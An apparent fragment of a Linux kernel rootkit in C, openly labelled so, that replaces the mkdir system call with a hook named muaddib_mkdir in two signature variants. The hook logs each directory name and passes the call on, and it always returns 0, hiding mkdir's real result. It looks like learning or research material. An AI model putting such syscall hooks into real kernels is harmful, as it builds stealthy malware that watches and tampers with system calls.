

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*og_mkdir)(const struct pt_regs *);

asmlinkage int muaddib_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);

    og_mkdir(regs);
    return 0;
}
#else
static asmlinkage long (*og_mkdir)(const char __user *pathname, umode_t mode);

asmlinkage int muaddib_mkdir(const char __user *pathname, umode_t mode)
{
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir_name);

    og_mkdir(pathname, mode);
    return 0;
}
#endif
